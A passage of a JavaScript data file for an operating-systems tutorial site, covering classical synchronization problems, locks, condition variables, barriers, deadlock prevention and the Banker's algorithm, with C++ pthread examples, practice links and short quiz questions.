          learn: '<div class="learn-section"><div class="learn-h">Producer-Consumer Problem (Bounded Buffer)</div><p class="learn-p">The <b>Producer-Consumer</b> problem is a classic synchronization problem. A <b>producer</b> generates data and places it in a buffer; a <b>consumer</b> removes data from the buffer. The buffer has a <b>fixed size N</b>.</p><p class="learn-p">Constraints:</p><ul class="learn-list"><li>The producer must wait if the buffer is <b>full</b>.</li><li>The consumer must wait if the buffer is <b>empty</b>.</li><li>Only one process can access the buffer at a time (mutual exclusion).</li></ul><p class="learn-p"><b>Solution using semaphores:</b></p><div class="learn-code">semaphore mutex = 1;     // Mutual exclusion for buffer access\nsemaphore empty = N;     // Count of empty slots (initially N)\nsemaphore full  = 0;     // Count of full slots (initially 0)\n\n// Producer:              // Consumer:\nwait(empty);              wait(full);\nwait(mutex);              wait(mutex);\n// add item to buffer     // remove item from buffer\nsignal(mutex);            signal(mutex);\nsignal(full);             signal(empty);</div><div class="learn-warn"><b>Warning:</b> The order of wait() operations matters! If you swap <code>wait(empty)</code> and <code>wait(mutex)</code> in the producer, a deadlock can occur: the producer holds the mutex but cannot proceed because the buffer is full, and the consumer cannot acquire the mutex to consume an item.</div></div><div class="learn-section"><div class="learn-h">Readers-Writers Problem</div><p class="learn-p">Multiple processes want to access a shared database. <b>Readers</b> only read the data; <b>writers</b> can both read and modify it. The constraints are:</p><ul class="learn-list"><li>Multiple readers can read simultaneously (no conflict).</li><li>Only one writer can write at a time (exclusive access).</li><li>No reader can read while a writer is writing.</li></ul><p class="learn-p"><b>First Readers-Writers Problem (Reader priority):</b> No reader is kept waiting unless a writer has already obtained access. Readers may starve writers.</p><div class="learn-code">semaphore rw_mutex = 1;    // Exclusive access for writers\nsemaphore mutex   = 1;     // Protects read_count\nint read_count = 0;\n\n// Reader:                   // Writer:\nwait(mutex);                 wait(rw_mutex);\nread_count++;                // ... write ...\nif (read_count == 1)         signal(rw_mutex);\n    wait(rw_mutex); // First reader locks out writers\nsignal(mutex);\n// ... read ...\nwait(mutex);\nread_count--;\nif (read_count == 0)\n    signal(rw_mutex); // Last reader unlocks\nsignal(mutex);</div><p class="learn-p"><b>Second Readers-Writers Problem (Writer priority):</b> Once a writer is ready, it gets access as soon as possible. New readers must wait if a writer is waiting. This can starve readers.</p><div class="learn-tip"><b>Tip:</b> The Readers-Writers problem appears frequently in database concurrency control. <b>Read-Write locks</b> (like <code>pthread_rwlock</code> in pthreads or <code>ReadWriteLock</code> in Java) implement this pattern.</div></div><div class="learn-section"><div class="learn-h">Dining Philosophers Problem</div><p class="learn-p">Five philosophers sit around a circular table. Each has a plate of food and a <b>chopstick</b> between each pair. To eat, a philosopher needs <b>both chopsticks</b> (left and right). They alternate between thinking and eating.</p><p class="learn-p"><b>Naive solution (leads to deadlock):</b></p><div class="learn-code">// Philosopher i:\nwait(chopstick[i]);         // Pick up left chopstick\nwait(chopstick[(i+1) % 5]); // Pick up right chopstick\n// ... eat ...\nsignal(chopstick[(i+1) % 5]);\nsignal(chopstick[i]);</div><p class="learn-p">If all five philosophers pick up their left chopstick simultaneously, they all wait for the right chopstick forever &mdash; <b>deadlock</b>!</p><p class="learn-p"><b>Solutions to prevent deadlock:</b></p><ol class="learn-list"><li><b>Allow at most 4 philosophers at the table:</b> Use a semaphore initialized to 4.</li><li><b>Asymmetric solution:</b> Odd-numbered philosophers pick up left first, then right. Even-numbered philosophers pick up right first, then left. This breaks the circular wait.</li><li><b>Use a monitor:</b> A philosopher can pick up chopsticks only if both are available (atomic check-and-grab).</li><li><b>Resource ordering:</b> Always pick up the lower-numbered chopstick first.</li></ol></div><div class="learn-section"><div class="learn-h">Sleeping Barber Problem</div><p class="learn-p">A barbershop has one barber, one barber chair, and N waiting chairs. If there are no customers, the barber sleeps. When a customer arrives, if all chairs are occupied, the customer leaves. Otherwise, the customer sits in a waiting chair (or wakes the barber if sleeping).</p><div class="learn-code">semaphore customers = 0;  // Number of waiting customers\nsemaphore barber   = 0;   // Barber is ready\nsemaphore mutex    = 1;   // Protects the counter\nint waiting = 0;          // Count of waiting customers\n\n// Barber:                  // Customer:\nwhile (true) {              wait(mutex);\n  wait(customers);          if (waiting &lt; N) {\n  wait(mutex);                waiting++;\n  waiting--;                  signal(customers);\n  signal(barber);             signal(mutex);\n  signal(mutex);              wait(barber);\n  // cut hair                 // get haircut\n}                           } else {\n                              signal(mutex);\n                              // leave\n                            }</div><div class="learn-tip"><b>Tip:</b> These classical problems are not just academic exercises. They model real-world scenarios: producer-consumer appears in message queues and I/O buffers; readers-writers in database locks; dining philosophers in resource allocation; sleeping barber in server request handling.</div></div>',
          code: `// Classical Synchronization Problems in C++ using pthreads
#include <iostream>
#include <pthread.h>
#include <semaphore.h>
#include <unistd.h>
#include <queue>
using namespace std;

// ===== PRODUCER-CONSUMER (BOUNDED BUFFER) =====
const int BUFFER_SIZE = 5;
queue<int> buffer;
pthread_mutex_t bufMutex = PTHREAD_MUTEX_INITIALIZER;
sem_t emptySlots, fullSlots;

void* producer(void* arg) {
    for (int i = 1; i <= 10; i++) {
        sem_wait(&emptySlots);           // Wait for empty slot
        pthread_mutex_lock(&bufMutex);   // Enter critical section
        buffer.push(i);
        cout << "Produced: " << i << " (size=" << buffer.size() << ")" << endl;
        pthread_mutex_unlock(&bufMutex); // Exit critical section
        sem_post(&fullSlots);            // Signal a full slot
        usleep(100000);
    }
    return NULL;
}

void* consumer(void* arg) {
    for (int i = 0; i < 10; i++) {
        sem_wait(&fullSlots);            // Wait for full slot
        pthread_mutex_lock(&bufMutex);
        int item = buffer.front();
        buffer.pop();
        cout << "Consumed: " << item << " (size=" << buffer.size() << ")" << endl;
        pthread_mutex_unlock(&bufMutex);
        sem_post(&emptySlots);           // Signal an empty slot
        usleep(150000);
    }
    return NULL;
}

// ===== READERS-WRITERS =====
int sharedData = 0;
int readerCount = 0;
pthread_mutex_t rcMutex = PTHREAD_MUTEX_INITIALIZER; // Protects readerCount
sem_t rwMutex; // Exclusive access for writers

void* reader(void* arg) {
    int id = *(int*)arg;
    pthread_mutex_lock(&rcMutex);
    readerCount++;
    if (readerCount == 1) sem_wait(&rwMutex); // First reader locks
    pthread_mutex_unlock(&rcMutex);

    // Reading
    cout << "Reader " << id << " reads: " << sharedData << endl;
    usleep(200000);

    pthread_mutex_lock(&rcMutex);
    readerCount--;
    if (readerCount == 0) sem_post(&rwMutex); // Last reader unlocks
    pthread_mutex_unlock(&rcMutex);
    return NULL;
}

void* writer(void* arg) {
    int id = *(int*)arg;
    sem_wait(&rwMutex); // Exclusive access
    sharedData += 10;
    cout << "Writer " << id << " wrote: " << sharedData << endl;
    usleep(300000);
    sem_post(&rwMutex);
    return NULL;
}

// ===== DINING PHILOSOPHERS (Resource Ordering) =====
const int NUM_PHIL = 5;
pthread_mutex_t chopstick[NUM_PHIL];

void* philosopher(void* arg) {
    int id = *(int*)arg;
    int left = id;
    int right = (id + 1) % NUM_PHIL;

    // Resource ordering: always pick lower-numbered first
    int first = min(left, right);
    int second = max(left, right);

    // Thinking
    cout << "Philosopher " << id << " thinking..." << endl;
    usleep(100000);

    // Pick up chopsticks in order
    pthread_mutex_lock(&chopstick[first]);
    pthread_mutex_lock(&chopstick[second]);

    // Eating
    cout << "Philosopher " << id << " eating." << endl;
    usleep(200000);

    // Put down chopsticks
    pthread_mutex_unlock(&chopstick[second]);
    pthread_mutex_unlock(&chopstick[first]);
    cout << "Philosopher " << id << " done eating." << endl;
    return NULL;
}

int main() {
    // --- Producer-Consumer ---
    cout << "=== Producer-Consumer ===" << endl;
    sem_init(&emptySlots, 0, BUFFER_SIZE);
    sem_init(&fullSlots, 0, 0);
    pthread_t prod, cons;
    pthread_create(&prod, NULL, producer, NULL);
    pthread_create(&cons, NULL, consumer, NULL);
    pthread_join(prod, NULL);
    pthread_join(cons, NULL);

    // --- Readers-Writers ---
    cout << "\\n=== Readers-Writers ===" << endl;
    sem_init(&rwMutex, 0, 1);
    pthread_t readers[3], writers[2];
    int rids[] = {1,2,3}, wids[] = {1,2};
    for (int i = 0; i < 3; i++)
        pthread_create(&readers[i], NULL, reader, &rids[i]);
    for (int i = 0; i < 2; i++)
        pthread_create(&writers[i], NULL, writer, &wids[i]);
    for (int i = 0; i < 3; i++) pthread_join(readers[i], NULL);
    for (int i = 0; i < 2; i++) pthread_join(writers[i], NULL);

    // --- Dining Philosophers ---
    cout << "\\n=== Dining Philosophers ===" << endl;
    for (int i = 0; i < NUM_PHIL; i++)
        pthread_mutex_init(&chopstick[i], NULL);
    pthread_t phil[NUM_PHIL];
    int pids[NUM_PHIL];
    for (int i = 0; i < NUM_PHIL; i++) {
        pids[i] = i;
        pthread_create(&phil[i], NULL, philosopher, &pids[i]);
    }
    for (int i = 0; i < NUM_PHIL; i++)
        pthread_join(phil[i], NULL);

    // Cleanup
    sem_destroy(&emptySlots); sem_destroy(&fullSlots);
    sem_destroy(&rwMutex);
    for (int i = 0; i < NUM_PHIL; i++)
        pthread_mutex_destroy(&chopstick[i]);

    return 0;
}`,
          problems: [
            ['Producer Consumer Problem', 'https://www.geeksforgeeks.org/producer-consumer-problem-using-semaphores-set-1/', 'Medium'],
            ['Dining Philosophers (LeetCode 1226)', 'https://leetcode.com/problems/the-dining-philosophers/', 'Medium'],
            ['Readers-Writers Problem', 'https://www.geeksforgeeks.org/readers-writers-problem-set-1-introduction-and-readers-preference-solution/', 'Hard'],
            ['Print Zero Even Odd (LeetCode 1116)', 'https://leetcode.com/problems/print-zero-even-odd/', 'Medium'],
          ],
          mcqs: [
            {q: 'In the Producer-Consumer problem with semaphores, what happens if the producer calls wait(mutex) before wait(empty)?', o: ['Nothing changes', 'Deadlock can occur when the buffer is full', 'The consumer starves', 'The program runs faster'], a: 1},
            {q: 'In the Dining Philosophers problem, what condition is violated if all philosophers pick up their left chopstick first?', o: ['Mutual exclusion', 'Hold and wait', 'Circular wait leads to deadlock', 'No preemption'], a: 2},
            {q: 'In the first Readers-Writers problem, which entity may suffer from starvation?', o: ['Readers', 'Writers', 'Both readers and writers', 'Neither'], a: 1},
          ],
        },
        {
          t: 'Read-Write Locks, Condition Variables & Barriers',
          learn: '<div class="learn-section"><div class="learn-h">Read-Write Locks (rwlock)</div><p class="learn-p">A <b>read-write lock</b> (also called shared-exclusive lock) implements the Readers-Writers pattern as a reusable primitive. Multiple readers can hold the lock concurrently, but a writer needs exclusive access.</p><div class="learn-code">// POSIX Read-Write Lock\npthread_rwlock_t rwlock;\npthread_rwlock_init(&amp;rwlock, NULL);\n\n// Reader:\npthread_rwlock_rdlock(&amp;rwlock);  // shared lock\n// ... read shared data ...\npthread_rwlock_unlock(&amp;rwlock);\n\n// Writer:\npthread_rwlock_wrlock(&amp;rwlock);  // exclusive lock\n// ... modify shared data ...\npthread_rwlock_unlock(&amp;rwlock);\n\n// C++ equivalent (C++17):\n#include &lt;shared_mutex&gt;\nstd::shared_mutex rw;\nrw.lock_shared();    // reader\nrw.unlock_shared();\nrw.lock();           // writer\nrw.unlock();</div><p class="learn-p"><b>Fairness policies:</b></p><ul class="learn-list"><li><b>Reader-preference:</b> New readers can acquire the lock even if a writer is waiting. Writers may starve.</li><li><b>Writer-preference:</b> Once a writer is waiting, no new readers are admitted. Readers may starve.</li><li><b>Fair (FIFO):</b> Requests served in order. No starvation but lower throughput.</li></ul></div><div class="learn-section"><div class="learn-h">Condition Variables</div><p class="learn-p">A <b>condition variable</b> allows threads to block until a specific condition becomes true. Always used with a mutex. The key insight: instead of busy-waiting (spinning) on a condition, a thread sleeps and is woken up only when the condition changes.</p><div class="learn-code">pthread_mutex_t mutex;\npthread_cond_t cond;\nint buffer_count = 0;\n\n// Producer:\npthread_mutex_lock(&amp;mutex);\n// ... add item to buffer ...\nbuffer_count++;\npthread_cond_signal(&amp;cond);  // wake one waiting consumer\npthread_mutex_unlock(&amp;mutex);\n\n// Consumer:\npthread_mutex_lock(&amp;mutex);\nwhile (buffer_count == 0)              // MUST use while, not if\n    pthread_cond_wait(&amp;cond, &amp;mutex);  // atomically unlocks mutex &amp; sleeps\n// ... remove item from buffer ...\nbuffer_count--;\npthread_mutex_unlock(&amp;mutex);</div><div class="learn-warn"><b>Critical:</b> Always use <code>while</code> (not <code>if</code>) around <code>cond_wait</code>. Spurious wakeups can occur — the thread may be woken without the condition being true. The while loop re-checks the condition after wakeup.</div><p class="learn-p"><b>signal vs broadcast:</b></p><ul class="learn-list"><li><code>pthread_cond_signal</code> — wakes <b>one</b> waiting thread</li><li><code>pthread_cond_broadcast</code> — wakes <b>all</b> waiting threads (use when multiple threads may be able to proceed, e.g., buffer went from full to empty)</li></ul></div><div class="learn-section"><div class="learn-h">Barriers</div><p class="learn-p">A <b>barrier</b> is a synchronization point where threads must all arrive before any can proceed. Used in parallel algorithms where a computation phase must complete before the next begins.</p><div class="learn-code">pthread_barrier_t barrier;\npthread_barrier_init(&amp;barrier, NULL, NUM_THREADS);\n\n// Each thread:\nvoid* worker(void* arg) {\n    // Phase 1: compute local portion\n    compute_phase1();\n\n    pthread_barrier_wait(&amp;barrier);  // all threads wait here\n    // ↑ No thread passes until ALL have arrived\n\n    // Phase 2: can safely read other threads\' phase 1 results\n    compute_phase2();\n    return NULL;\n}</div></div><div class="learn-section"><div class="learn-h">Spinlocks vs Mutexes</div><table class="learn-table"><tr><th>Feature</th><th>Spinlock</th><th>Mutex</th></tr><tr><td>Waiting behavior</td><td>Busy-wait (loops checking the lock)</td><td>Sleep (OS puts thread to sleep)</td></tr><tr><td>CPU usage while waiting</td><td>100% on one core</td><td>~0% (sleeping)</td></tr><tr><td>Context switch</td><td>None (stays on CPU)</td><td>Two (sleep + wake)</td></tr><tr><td>Best for</td><td>Very short critical sections (< few μs)</td><td>Longer critical sections, I/O</td></tr><tr><td>Used in</td><td>Kernel code, lock-free data structures</td><td>Application code, general purpose</td></tr></table><div class="learn-tip"><b>Interview tip:</b> "When would you use a spinlock over a mutex?" — When the critical section is extremely short (nanoseconds) and context switch overhead would exceed the wait time. Linux kernel uses spinlocks extensively for this reason.</div></div><div class="learn-section"><div class="learn-h">Lock-Free and Wait-Free Data Structures</div><p class="learn-p"><b>Lock-free</b>: At least one thread makes progress at any time (no global blocking). Uses atomic operations (CAS — Compare-And-Swap).</p><p class="learn-p"><b>Wait-free</b>: Every thread makes progress in bounded steps (strongest guarantee). Very hard to implement.</p><div class="learn-code">// Compare-And-Swap (CAS) — the building block\n// Atomically: if *addr == expected, set *addr = desired, return true\nbool cas(int* addr, int expected, int desired);\n\n// Lock-free stack push using CAS:\nvoid push(Node* node) {\n    do {\n        node-&gt;next = top;        // read current top\n    } while (!cas(&amp;top, node-&gt;next, node));  // retry if top changed\n}</div><div class="learn-warn"><b>ABA problem:</b> Thread reads A, another thread changes A→B→A, first thread\'s CAS succeeds but the state changed. Fix: use tagged pointers (add a version counter) or hazard pointers.</div></div>',
          code: `// Read-Write Locks, Condition Variables, and Barriers in C++
#include <iostream>
#include <thread>
#include <shared_mutex>
#include <mutex>
#include <condition_variable>
#include <vector>
#include <chrono>
using namespace std;

// Shared data protected by read-write lock
shared_mutex rw_mutex;
int shared_data = 0;

void reader(int id) {
    shared_lock<shared_mutex> lock(rw_mutex);
    cout << "Reader " << id << " reads: " << shared_data << endl;
}

void writer(int id, int value) {
    unique_lock<shared_mutex> lock(rw_mutex);
    shared_data = value;
    cout << "Writer " << id << " wrote: " << value << endl;
}

// Producer-Consumer with condition variable
mutex mtx;
condition_variable cv;
vector<int> buffer;
const int MAX_BUF = 5;
bool done = false;

void producer() {
    for (int i = 0; i < 10; i++) {
        unique_lock<mutex> lock(mtx);
        cv.wait(lock, [] { return buffer.size() < MAX_BUF; });
        buffer.push_back(i);
        cout << "Produced: " << i << endl;
        cv.notify_all();
    }
    unique_lock<mutex> lock(mtx);
    done = true;
    cv.notify_all();
}

void consumer() {
    while (true) {
        unique_lock<mutex> lock(mtx);
        cv.wait(lock, [] { return !buffer.empty() || done; });
        if (buffer.empty() && done) break;
        int val = buffer.back();
        buffer.pop_back();
        cout << "Consumed: " << val << endl;
        cv.notify_all();
    }
}

int main() {
    // Read-Write Lock demo
    cout << "=== Read-Write Lock ===" << endl;
    vector<thread> threads;
    threads.emplace_back(writer, 1, 42);
    for (int i = 0; i < 3; i++)
        threads.emplace_back(reader, i);
    threads.emplace_back(writer, 2, 99);
    for (auto& t : threads) t.join();
    threads.clear();

    // Producer-Consumer with condition variable
    cout << "\\n=== Condition Variable (Producer-Consumer) ===" << endl;
    thread prod(producer);
    thread cons(consumer);
    prod.join();
    cons.join();

    return 0;
}`,
          problems: [
            ['Print in Order (LeetCode 1114)', 'https://leetcode.com/problems/print-in-order/', 'Easy'],
            ['Building H2O (LeetCode 1117)', 'https://leetcode.com/problems/building-h2o/', 'Medium'],
            ['The Dining Philosophers (LeetCode 1226)', 'https://leetcode.com/problems/the-dining-philosophers/', 'Medium'],
          ],
          mcqs: [
            {q: 'Why must you use while (not if) with condition variables?', o: ['For better performance', 'Because spurious wakeups can occur', 'Because the mutex might not be locked', 'To prevent deadlocks'], a: 1},
            {q: 'When is a spinlock preferred over a mutex?', o: ['Always in user-space code', 'When the critical section is very short and context-switch overhead exceeds wait time', 'When threads need to sleep', 'When there are many competing threads'], a: 1},
            {q: 'CAS (Compare-And-Swap) is the basis for:', o: ['Mutex implementation', 'Lock-free data structures', 'Semaphores only', 'Thread creation'], a: 1},
          ],
        },
      ],
    },

    // ===== TAB: DEADLOCKS =====
    {
      id: 'dead', t: 'Deadlocks',
      topics: [
        // ----- Topic 0: Deadlock Conditions & Prevention -----
        {
          t: 'Deadlock Conditions & Prevention',
          learn: '<div class="learn-section"><div class="learn-h">What is a Deadlock?</div><p class="learn-p">A <b>deadlock</b> is a situation where a set of processes are blocked because each process is holding a resource and waiting for another resource held by another process in the set. No process can make progress.</p><p class="learn-p"><b>Example:</b> Process P1 holds resource R1 and wants R2. Process P2 holds R2 and wants R1. Neither can proceed.</p></div><div class="learn-section"><div class="learn-h">Coffman\'s Four Necessary Conditions</div><p class="learn-p">A deadlock can occur <b>if and only if</b> all four of these conditions hold simultaneously:</p><ol class="learn-list"><li><b>Mutual Exclusion:</b> At least one resource must be held in a non-sharable mode. Only one process at a time can use the resource.</li><li><b>Hold and Wait:</b> A process must be holding at least one resource and waiting to acquire additional resources held by other processes.</li><li><b>No Preemption:</b> Resources cannot be forcibly taken away from a process; they must be released voluntarily.</li><li><b>Circular Wait:</b> There exists a circular chain of processes, each waiting for a resource held by the next process in the chain.</li></ol><div class="learn-tip"><b>Tip:</b> Remember these four conditions by the mnemonic <b>MHNC</b> (Mutual exclusion, Hold and wait, No preemption, Circular wait). If you can break ANY one condition, deadlock cannot occur.</div></div><div class="learn-section"><div class="learn-h">Resource Allocation Graph (RAG)</div><p class="learn-p">A <b>Resource Allocation Graph</b> is a directed graph used to describe deadlocks:</p><ul class="learn-list"><li><b>Process nodes:</b> Circles (P1, P2, ...)</li><li><b>Resource nodes:</b> Rectangles with dots representing instances (R1 with 2 dots = 2 instances)</li><li><b>Request edge:</b> P<sub>i</sub> &rarr; R<sub>j</sub> (process requests resource)</li><li><b>Assignment edge:</b> R<sub>j</sub> &rarr; P<sub>i</sub> (resource is assigned to process)</li></ul><p class="learn-p"><b>Deadlock detection using RAG:</b></p><ul class="learn-list"><li>If the graph contains a <b>cycle</b> and each resource type has <b>only one instance</b>, then a deadlock exists.</li><li>If resources have <b>multiple instances</b>, a cycle is necessary but <b>not sufficient</b> for deadlock.</li></ul></div><div class="learn-section"><div class="learn-h">Deadlock Prevention</div><p class="learn-p"><b>Deadlock prevention</b> ensures that at least one of the four necessary conditions cannot hold:</p><table class="learn-table"><tr><th>Condition</th><th>Prevention Strategy</th><th>Drawback</th></tr><tr><td>Mutual Exclusion</td><td>Use sharable resources (e.g., read-only files). Cannot be applied to inherently non-sharable resources like printers.</td><td>Not always possible</td></tr><tr><td>Hold and Wait</td><td><b>Option 1:</b> Request all resources before execution starts. <b>Option 2:</b> Release all held resources before requesting new ones.</td><td>Low resource utilization, possible starvation</td></tr><tr><td>No Preemption</td><td>If a process holding resources requests one that cannot be allocated, release all held resources and restart later.</td><td>Only works for resources whose state can be saved (CPU registers, memory)</td></tr><tr><td>Circular Wait</td><td>Impose a <b>total ordering</b> on all resource types. Processes must request resources in increasing order of enumeration.</td><td>May be inconvenient; requires knowing all resource types in advance</td></tr></table><div class="learn-warn"><b>Warning:</b> Preventing mutual exclusion is generally not practical since many resources (printers, tape drives, mutexes) are inherently non-sharable. The most practical prevention strategy is usually <b>breaking circular wait</b> via resource ordering.</div></div><div class="learn-section"><div class="learn-h">Deadlock Avoidance</div><p class="learn-p"><b>Deadlock avoidance</b> requires advance knowledge of resource needs. The system dynamically examines the resource-allocation state to ensure a <b>safe state</b> is maintained.</p><p class="learn-p">A state is <b>safe</b> if there exists a <b>safe sequence</b> of all processes such that each process can obtain all needed resources from currently available resources plus those held by all preceding processes in the sequence. If no safe sequence exists, the state is <b>unsafe</b>.</p><div class="learn-tip"><b>Tip:</b> An <b>unsafe state</b> does NOT mean deadlock will definitely occur &mdash; it means deadlock <b>might</b> occur. A <b>safe state</b> guarantees no deadlock. Deadlock avoidance ensures the system never enters an unsafe state.</div><p class="learn-p">The most famous deadlock avoidance algorithm is the <b>Banker\'s Algorithm</b> (covered in the next topic).</p></div><div class="learn-section"><div class="learn-h">Deadlock Handling Strategies Comparison</div><table class="learn-table"><tr><th>Strategy</th><th>Description</th><th>Used In</th></tr><tr><td>Prevention</td><td>Structurally eliminate one of the four conditions</td><td>Simple embedded systems</td></tr><tr><td>Avoidance</td><td>Dynamically check before granting resources (Banker\'s)</td><td>Systems with known max resource needs</td></tr><tr><td>Detection + Recovery</td><td>Allow deadlock, detect it, then recover</td><td>Databases (transaction rollback)</td></tr><tr><td>Ignorance (Ostrich)</td><td>Ignore the problem entirely</td><td>Most general-purpose OS (Linux, Windows)</td></tr></table><div class="learn-warn"><b>Warning:</b> Most real operating systems (Linux, Windows, macOS) use the <b>Ostrich Algorithm</b> &mdash; they simply ignore deadlocks! The reasoning is that the overhead of prevention/avoidance is not justified for the rare occurrence of deadlocks in practice. Deadlocks are handled manually (e.g., user kills a hung process).</div></div>',
          code: `// Deadlock Detection using Resource Allocation Graph (RAG)
// Cycle detection in a directed graph using DFS
#include <iostream>
#include <vector>
#include <unordered_map>
using namespace std;

class DeadlockDetector {
    int numProcesses, numResources;
    // Adjacency list: node i -> list of nodes it points to
    // Processes: 0..numProcesses-1
    // Resources: numProcesses..numProcesses+numResources-1
    vector<vector<int>> adj;
    int totalNodes;

public:
    DeadlockDetector(int p, int r) : numProcesses(p), numResources(r) {
        totalNodes = p + r;
        adj.resize(totalNodes);
    }

    // Process pid requests resource rid
    void addRequest(int pid, int rid) {
        int rNode = numProcesses + rid;
        adj[pid].push_back(rNode); // P -> R (request edge)
        cout << "P" << pid << " requests R" << rid << endl;
    }

    // Resource rid is assigned to process pid
    void addAssignment(int rid, int pid) {
        int rNode = numProcesses + rid;
        adj[rNode].push_back(pid); // R -> P (assignment edge)
        cout << "R" << rid << " assigned to P" << pid << endl;
    }

    // DFS-based cycle detection
    bool hasCycleDFS(int node, vector<int>& visited, vector<int>& recStack) {
        visited[node] = 1;
        recStack[node] = 1;

        for (int neighbor : adj[node]) {
            if (!visited[neighbor]) {
                if (hasCycleDFS(neighbor, visited, recStack))
                    return true;
            } else if (recStack[neighbor]) {
                return true; // Back edge found -> cycle
            }
        }
        recStack[node] = 0;
        return false;
    }

    bool detectDeadlock() {
        vector<int> visited(totalNodes, 0);
        vector<int> recStack(totalNodes, 0);

        for (int i = 0; i < totalNodes; i++) {
            if (!visited[i]) {
                if (hasCycleDFS(i, visited, recStack)) {
                    return true;
                }
            }
        }
        return false;
    }
};

int main() {
    // Example: 3 processes, 3 resources (single instance each)
    DeadlockDetector dd(3, 3);

    // Setup: P0 holds R0, wants R1
    //        P1 holds R1, wants R2
    //        P2 holds R2, wants R0  -> Circular wait!
    dd.addAssignment(0, 0); // R0 -> P0
    dd.addRequest(0, 1);    // P0 -> R1
    dd.addAssignment(1, 1); // R1 -> P1
    dd.addRequest(1, 2);    // P1 -> R2
    dd.addAssignment(2, 2); // R2 -> P2
    dd.addRequest(2, 0);    // P2 -> R0

    cout << "\\nDeadlock " << (dd.detectDeadlock() ? "DETECTED!" : "not found.")
         << endl;

    // Example without deadlock
    cout << "\\n--- No Deadlock Example ---" << endl;
    DeadlockDetector dd2(2, 2);
    dd2.addAssignment(0, 0); // R0 -> P0
    dd2.addRequest(0, 1);    // P0 -> R1
    dd2.addAssignment(1, 1); // R1 -> P1
    // P1 does not request R0, so no cycle

    cout << "Deadlock " << (dd2.detectDeadlock() ? "DETECTED!" : "not found.")
         << endl;

    return 0;
}`,
          problems: [
            ['Deadlock in Operating System', 'https://www.geeksforgeeks.org/introduction-of-deadlock-in-operating-system/', 'Easy'],
            ['Deadlock Prevention and Avoidance', 'https://www.geeksforgeeks.org/deadlock-prevention/', 'Medium'],
            ['Resource Allocation Graph', 'https://www.geeksforgeeks.org/resource-allocation-graph-rag-in-operating-system/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which of the following is NOT a necessary condition for deadlock?', o: ['Mutual Exclusion', 'Hold and Wait', 'Starvation', 'Circular Wait'], a: 2},
            {q: 'If a Resource Allocation Graph has a cycle but a resource type has multiple instances, deadlock:', o: ['Definitely exists', 'May or may not exist', 'Definitely does not exist', 'Cannot be determined'], a: 1},
            {q: 'Which deadlock handling strategy is used by most modern general-purpose operating systems?', o: ['Prevention', 'Avoidance', 'Detection and Recovery', 'Ignore (Ostrich Algorithm)'], a: 3},
          ],
        },
        // ----- Topic 1: Banker's Algorithm & Deadlock Detection -----
        {
          t: 'Banker\'s Algorithm & Deadlock Detection',
          learn: '<div class="learn-section"><div class="learn-h">Banker\'s Algorithm Overview</div><p class="learn-p">The <b>Banker\'s Algorithm</b>, proposed by Dijkstra, is a deadlock <b>avoidance</b> algorithm. It is named after the way a banker manages loans to ensure the bank never runs out of cash. The algorithm checks if granting a resource request will leave the system in a <b>safe state</b>.</p><p class="learn-p"><b>Required information:</b></p><ul class="learn-list"><li>Each process must declare its <b>maximum resource needs</b> in advance.</li><li>The system must know the <b>total available</b> resources of each type.</li></ul></div><div class="learn-section"><div class="learn-h">Data Structures</div><p class="learn-p">Let <b>n</b> = number of processes, <b>m</b> = number of resource types.</p><table class="learn-table"><tr><th>Structure</th><th>Dimension</th><th>Description</th></tr><tr><td><b>Available</b></td><td>[m]</td><td>Number of available instances of each resource type</td></tr><tr><td><b>Max</b></td><td>[n][m]</td><td>Maximum demand of each process for each resource type</td></tr><tr><td><b>Allocation</b></td><td>[n][m]</td><td>Currently allocated resources for each process</td></tr><tr><td><b>Need</b></td><td>[n][m]</td><td>Remaining needs: Need[i][j] = Max[i][j] - Allocation[i][j]</td></tr></table></div><div class="learn-section"><div class="learn-h">Safety Algorithm</div><p class="learn-p">The safety algorithm determines if the current state is safe:</p><ol class="learn-list"><li>Let <b>Work</b> = Available (copy), <b>Finish</b>[i] = false for all i.</li><li>Find a process i such that Finish[i] == false AND Need[i] &le; Work (for all resource types).</li><li>If found: Work = Work + Allocation[i]; Finish[i] = true; Go to step 2.</li><li>If no such process exists: If Finish[i] == true for all i, the system is in a <b>safe state</b>. The order of processes found is the <b>safe sequence</b>.</li></ol><p class="learn-p"><b>Time complexity:</b> <span class="learn-complexity">O(n^2 * m)</span> where n is the number of processes and m is the number of resource types.</p></div><div class="learn-section"><div class="learn-h">Resource Request Algorithm</div><p class="learn-p">When process P<sub>i</sub> makes a request Request<sub>i</sub>:</p><ol class="learn-list"><li>If Request<sub>i</sub> &gt; Need<sub>i</sub>, raise an error (process exceeded its declared maximum).</li><li>If Request<sub>i</sub> &gt; Available, the process must wait.</li><li>Pretend to allocate: Available -= Request<sub>i</sub>; Allocation<sub>i</sub> += Request<sub>i</sub>; Need<sub>i</sub> -= Request<sub>i</sub>.</li><li>Run the <b>safety algorithm</b>. If safe, grant the request. If unsafe, roll back and make the process wait.</li></ol></div><div class="learn-section"><div class="learn-h">Worked Example</div><p class="learn-p">5 processes (P0-P4), 3 resource types (A=10, B=5, C=7 total):</p><table class="learn-table"><tr><th>Process</th><th>Allocation (A B C)</th><th>Max (A B C)</th><th>Need (A B C)</th></tr><tr><td>P0</td><td>0 1 0</td><td>7 5 3</td><td>7 4 3</td></tr><tr><td>P1</td><td>2 0 0</td><td>3 2 2</td><td>1 2 2</td></tr><tr><td>P2</td><td>3 0 2</td><td>9 0 2</td><td>6 0 0</td></tr><tr><td>P3</td><td>2 1 1</td><td>2 2 2</td><td>0 1 1</td></tr><tr><td>P4</td><td>0 0 2</td><td>4 3 3</td><td>4 3 1</td></tr></table><p class="learn-p">Available = (10-7, 5-2, 7-5) = <b>(3, 3, 2)</b></p><p class="learn-p"><b>Safety check:</b></p><ul class="learn-list"><li>Work = (3,3,2). P1 needs (1,2,2) &le; (3,3,2). Execute P1. Work = (3,3,2)+(2,0,0) = (5,3,2).</li><li>P3 needs (0,1,1) &le; (5,3,2). Execute P3. Work = (5,3,2)+(2,1,1) = (7,4,3).</li><li>P4 needs (4,3,1) &le; (7,4,3). Execute P4. Work = (7,4,3)+(0,0,2) = (7,4,5).</li><li>P0 needs (7,4,3) &le; (7,4,5). Execute P0. Work = (7,4,5)+(0,1,0) = (7,5,5).</li><li>P2 needs (6,0,0) &le; (7,5,5). Execute P2. Work = (7,5,5)+(3,0,2) = (10,5,7).</li></ul><p class="learn-p"><b>Safe sequence:</b> &lt;P1, P3, P4, P0, P2&gt;. The system is in a safe state.</p></div><div class="learn-section"><div class="learn-h">Deadlock Detection Algorithm</div><p class="learn-p">When 